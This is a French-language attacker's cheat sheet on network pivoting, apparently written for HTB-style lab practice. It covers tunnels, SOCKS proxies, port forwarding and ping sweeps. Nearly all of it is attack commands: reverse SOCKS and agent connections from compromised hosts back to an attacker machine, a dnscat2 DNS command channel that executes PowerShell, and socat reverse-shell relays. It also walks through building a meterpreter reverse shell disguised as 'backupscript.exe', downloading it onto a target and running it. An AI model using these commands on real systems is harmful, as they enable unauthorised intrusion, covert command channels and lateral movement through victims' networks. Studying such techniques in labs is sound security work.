
- [[#PIVOTING]]
- [[#DOUBLE PIVOTING (SOCKS PROXY)]]
- [[#TUNNELING & PORT FORWARDING]]
- [[#PING SWEEP]]

---
# PIVOTING

[[#TUNNELS VPN LIKE]]
- [[#SSHUTTLE]]
- [[#LIGOLO-NG]]


[[#SOCKS PROXY]]
- [[#CHISEL]]
- [[#SSH]]
- [[#RPIVOT (Reverse SOCKS WEB)]]
- [[#PLINK over SSH (PuTTY WINDOWS)]]
- [[#METASPLOIT]]



# TUNNELS VPN LIKE

## SSHUTTLE

> [!TIP]
> Tunnel ssh uniquement

Install

```bash
sudo apt install sshuttle
```

Proxy SOCKS

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

Proxy SOCKS avec clé privé

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v --ssh-cmd 'ssh -i /path/to/key'
```

Run n'importe quel tool sans passer par proxychains

Nmap (Scan avec Pn obligatoire pour considérer l'host comme étant up et sV pour afficher les Services qui tournent (si pas de version affiché alors le service ne tourne pas))

```bash
nmap -sT -v -sV -F 172.16.5.19 -A -Pn --open
```

## LIGOLO-NG

> [!TIP]
> Créer une interface tun pour y faire passer le trafic.

https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8

### 1. Prérequis sur C2

#### Linux

1. Lancer proxy

```
sudo ./proxy -selfcert selfcert-domain <domain>
```

2. Créer interface tun

```
interface_create --name "evil-cha"
```

2. Activer l'interface

```
sudo ip link set evil-cha up
```

3. Créer routes

```
interface_add_route --name evil-cha --route 192.168.2.0/24
```

#### Windows 

1. Télécharger wintun driver -> https://www.wintun.net/
2. Placer la DLL dans le même dossier que Ligolo (attention à l'architecture)
3. Lancer proxy

```
.\proxy -selfcert selfcert-domain <domain>
```

4. Créer interface tun

```
interface_create --name "evil-cha"
```

5.  Créer routes

```
netsh int ipv4 show interfaces
```

```
route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```



### 2. Tunnel

1. coté attaquant

```
sudo ./proxy -selfcert selfcert-domain <domain>
```

ou preciser une adresse de listener (en cas de firewall coté cible)

```
sudo ./proxy -laddr "0.0.0.0:53" -selfcert selfcert-domain painters.htb
```

```
certificate_fingerprint
```


2. coté cible

```
./agent -connect <ip_attacker>:11601 -v -accept-fingerprint <certificate_fingerprint>
```


3. coté attaquant

choisir session

```
session
```

Démarrer le tunnel

```
tunnel_start --tun evil-cha
```

Afficher la config réseau

```
ifconfig
```

Créer routes

```
interface_add_route --name evil-cha --route 172.16.5.0/24
```


Run n'importe quel tool sans passer par proxychains

> [!TIP]
> Nmap (Pn non necessaire et possible d'utiliser sS)

```bash
nmap -sS -vv -sV -sC -F 172.16.5.19 -A --open
```




Local Port forwarding de tous les ports sur la session cible

```
interface_add_route --name evil-cha --route 240.0.0.1/32
```

Listener pour remote port forwarding

```
listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp
```



---

# SOCKS PROXY

## CHISEL

> [!NOTE]
> Proxyfie sur le port 1080
> En reverse socks, placer le client sur le point de pivot souhaité, si d'autres points de pivots sont présents entre le serveur et le client, alors faire un port forwarding sur ceux-ci vers notre machine attaquant, le client doit pointer pointera alors vers le point de pivot accessible pour lui

https://github.com/jpillora/chisel

### Reverse socks

Coté attaquant
```cmd
./chiselx64 server -p 8080 --reverse --socks5
```

Coté cible
```cmd
.\chisel.exe client -v <ip_serveur>:8080 R:socks
```

### Socks

Coté cible
```cmd
./chiselx64 server -p 1234 --socks5
```

Coté attaquant
```cmd
.\chisel.exe client -v <ip_cible>:1234 socks
```



nmap

```bash
proxychains -f /etc/proxychains4.conf nmap -sT -v -sV -F 172.16.5.19 -A -Pn --open
```



## SSH
### Redirection Dynamique

Activer la redirection de ports dynamique afin de rediriger tout le trafic passant par le proxy 9050  vers le serveur ssh

```shell
ssh -N -D 9050 user@serveurssh
```

Vérifier conf proxychains

```shell
tail -4 /etc/proxychains4.conf
```

Nmap en passant par proxychains (par tranche d'ip) (SOCKS Tunneling) (Uniquement Full TCP possible) afin d'identifier les hotes uniquement:

```shell
proxychains -f /etc/proxychains4.conf nmap -v -sn 172.16.5.1-200
```

Possible d'utiliser metasploit directement avec

```shell
proxychains -f /etc/proxychains4.conf msfconsole
```

RDP

```bash
proxychains -f /etc/proxychains4.conf xfreerdp3 /u:victor /p:pass@123 /v:172.16.5.19 /drive:share,/tmp/
```


## RPIVOT (Reverse SOCKS WEB)

> [!TIP]
> Python2.7 requis
> Serveur WEB

```shell
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```


```bash
git clone https://github.com/klsecservices/rpivot.git
```

Depuis machine attaquant

```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Depuis machine pivot (transférer le dossier complet RPIVOT)

```sh
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

Si authentification NTLM

```shell
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

Accéder au serveur

```shell
proxychains firefox-esr 172.16.5.135:80
```


## PLINK over SSH (PuTTY WINDOWS)

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

A faire fonctionner avec proxyfier (Proxychains pour WINDOWS)-> https://www.proxifier.com/

Lancer Proxifier APRES Plink

Lancer Proxifier (Windows) -> Profile -> Proxy Servers

 Définir l'ip du serveur C2 et le port 1080

![[Pasted image 20250915210900.png]]

Créer une proxification rule dans advanced, laisser Any applications et définir le subnet de la target

![[Pasted image 20250915211029.png]]

Possible maintenant de lancer les tools comme ADExplorer, Active Directory ou PowerView en local, le trafic sera redirigé (Penser à créer un PSCredential Object pour les scripts powershell). Ou injecter les tickets kerberos en mémoire avec rubeus ou mimikatz dans une session runas /netonly.


## METASPLOIT

### Socks Proxy

Module SOCKS PROXY (version 4a et 5)

```msfconsole
use auxiliary/server/socks_proxy
```

Vérifier conf proxychains

```shell
tail -4 /etc/proxychains4.conf
```

Créer routes avec autoroute afin de router les paquets depuis la session vers le réseau cible

Depuis session Meterpreter

```meterpreter
run autoroute -s 172.16.5.0/23
```

ou depuis msf

```msf
use post/multi/manage/autoroute
```

```msf
set SESSION 1
```

```msf
set SUBNET 172.16.5.0
```

Lister les routes configurées depuis session meterpreter

```meterpreter
run autoroute -p
```

Nmap en passant par proxychains (par tranche d'ip) (SOCKS Tunneling) (Uniquement Full TCP possible) afin d'identifier les hotes uniquement:

```shell
proxychains -f /etc/proxychains4.conf nmap -v -sn 172.16.5.1-200
```

---

# DOUBLE PIVOTING

  - 
  - [[#SocksOverRDP / Citrix + Proxifier]]





# SOCKS PROXY

## SocksOverRDP / Citrix  + Proxifier

https://github.com/nccgroup/SocksOverRDP/releases

https://www.proxifier.com/download/#win-tab

1. Transférer le zip sur la target et charger la dll SocksOverRDP-Plugin.dll (En tant qu'admin)

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```

2. Dans mstsc mettre les performancee en mode modem dans l'onglet experience.

3. Se connecter en rdp sur la 2eme target depuis la 1ere

4. Transférer SocksOverRDP-Server.exe sur la target2 et l'executer en tant qu'admin

5. Vérifier sur la target1 que le la machine écoute sur le port 1080

```cmd
netstat -antb | findstr 1080
```

5. Transférer proxifier portable sur la target 1

6. Le lancer et le configurer sur le listener en 127.0.0.1

7. Dans mstsc mettre les performancee en mode modem dans l'onglet experience.

8. Se connecter à la target3 depuis la target1 avec mstsc.


---

# TUNNELING & PORT FORWARDING

- [[#LOCAL PORT FORWARDING]]
- [[#**TUNNELING**]]
- [[#**REVERSE / REMOTE PORT FORWARDING**]]

## LOCAL PORT FORWARDING

> [!TIP]
> Permet de rediriger le trafic depuis la machine de l'attaquant ou point de pivot vers la machine cible.

### SSH

![[Pasted image 20250331000557.png]]


```bash
ssh -N -L <port local>:<serveur2>:<portserveur2> <user_serveur1>@<ip_serveur1>
```

Multiple ports

```shell
ssh -N -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

### CHISEL

Coté serveur

```bash
./chiselx64 server -p 8080 --reverse --socks5
```


Coté client

```bash
./chiselx64 client <ip_attacker>:8080 R:<port_accessible_depuis_attacker>:127.0.0.1:<port_a_rediriger>
```


### METASPLOIT

Depuis la session meterpreter

```shell
 portfwd add -l 3300  -r 172.16.5.19 -p 3389
```

### NETSH (Windows)

> [!TIP]
> tool natif
> Requiert les droits d'admin

Depuis point de pivot

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```


## **TUNNELING**

### PTunnel-ng (Tunnel ICMP)

> [!IMPORTANT]
> Necessite les droits d'admin sur la target

Session SSH au travers de requêtes d'echo

https://github.com/utoni/ptunnel-ng.git

```shell
sudo apt install automake autoconf -y
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

Transférer le repo vers la target

```shell
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Lancer ptunnelng sur la target

```shell
cd src
./ptunnel-ng -r<iptarget> -R22
```

Se connecter depuis la machine attaquante

```shell
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

```shell
ssh -p2222 -l<user> 127.0.0.1
```

Activer le port forwarding dynamique avec SSH

```shell
ssh -N -D 9050 -p2222 -lubuntu 127.0.0.1
```

Nmap avec proxychains

```shell
proxychains nmap -sV -sT 172.16.5.19 -p3389
```


### DNSCAT2 (Tunnel DNS) (Lent)

> [!TIP]
> C2 Chiffré de bout en bout

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

Version powershell
```shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Depuis l'attaquant

```shell
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

Depuis le client

```powershell-session
Import-Module .\dnscat2.ps1
```

```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <key_server_generated> -Exec powershell 
```

Lister les options

```bash
?
```

Shell

```shell
window -i 1
```




## **REVERSE / REMOTE PORT FORWARDING**


> [!TIP]
> Permet de rediriger le trafic depuis le point de pivot vers la machine de l'attaquant.

### CHISEL

Coté attaquant
```cmd
./chiselx64 server -p 8080 --reverse
```

Coté cible
```cmd
.\chiselx64.exe client <ip_attacker>:<port_attacker> R:<port_accessible_depuis_attacker>:127.0.0.1:<port_a_rediriger>
```

### SSH

![[Pasted image 20250331012847.png]]


```shell
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipcible> -vN
```
#### Reverse shell

Créer un payload reverse shell avec comme ip et listener le point de pivot

```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

Lancer listener sur la machine de l'attaquant (0.0.0.0 port 8000)

```shell
use exploit/multi/handler
```

```msf
set LHOST 0.0.0.0
```

```msf
set LPORT 8000
```

```msf
set payload windows/x64/meterpreter/reverse_https
```


Transférer la charge sur la machine pivot

```shell
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

Lancer serveur http sur le pivot pour transférer la charge sur la cible

```shell
python3 -m http.server 8123
```

Récupérer la charge depuis la cible

```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Lancer le reverse port forwarding

```shell
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipcible> -vN
```

Exécuter la charge sur la cible.

### METASPLOIT

Depuis la session meterpreter

```meterpreter
portfwd add -R -l 8081 -L 10.10.14.18 -p 1234
```

Configurer listener sur le port 8081 depuis msf

```msfconsole
use multi/handler
```

### SOCAT (Depuis point de pivot)

reverse shell

```shell
socat TCP4-LISTEN:8080,fork TCP4:<ip_attaquant>:<port_attaquant>
```

bind shell

```shell
socat TCP4-LISTEN:8080,fork TCP4:<ip_cible>:<port_cible>
```

---

# PING SWEEP

> [!TIP]
> Identifier les hôtes actifs sur le réseau avec requête d'echo
> Relancer plusieurs fois car peut manquer des reponses

## NMAP

```bash
nmap -vv 172.16.6.0/24 -sn 
```

## Point de pivot Linux

```shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

## Point de pivot Windows

### Cmd

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### PowerShell

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

## Session Meterpreter

Post module Ping sweep -> permet d'effectuer un ping sweep depuis la session sur le pivot. 

```shell
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```





